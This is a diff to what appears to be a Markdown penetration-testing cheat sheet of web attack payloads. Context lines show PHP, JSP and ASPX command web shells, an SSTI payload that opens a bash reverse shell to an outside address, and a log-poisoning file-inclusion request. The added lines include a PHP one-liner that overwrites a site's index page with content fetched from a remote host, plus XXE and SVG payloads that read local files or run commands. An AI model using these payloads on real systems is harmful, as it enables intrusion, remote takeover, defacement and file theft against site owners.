@@ -125,6 +125,7 @@ XSS to LFI <br>
 Code Shell  <br>
 PHP
 ```<?php system($_GET['cmd']); ?>```<br>
+```<?php file_put_contents('index.html', file_get_contents('http://example.com:8080/general.html'));```<br>
 JSP
 ```<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>```<br>
 ASPX
@@ -137,6 +138,12 @@ SSTI <br>
 ```{{ self.__init__.__globals__.__builtins__ }}```<br>
 ```{{ request.application.globals.builtins.import('os').popen('bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"').read() }}```
 
+
+XXE <br>
+```<?xml version="1.0" standalone="yes"?>```
+```<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>```<br>
+```<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="40" x="0" y="16">&xxe;</text></svg>```<br>
+```<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"> <image xlink:href="expect://ls"></image> </svg>```<br>
 
 FFUF <br>
 Install
@@ -204,6 +211,8 @@ User-Agent: <?php system($_GET['cmd']); ?>
 ```
 http://target.site/index.php?page=../../../../var/log/apache2/access.log&cmd=id
 ```
+
+
 
 
 ## 🔗 Contact
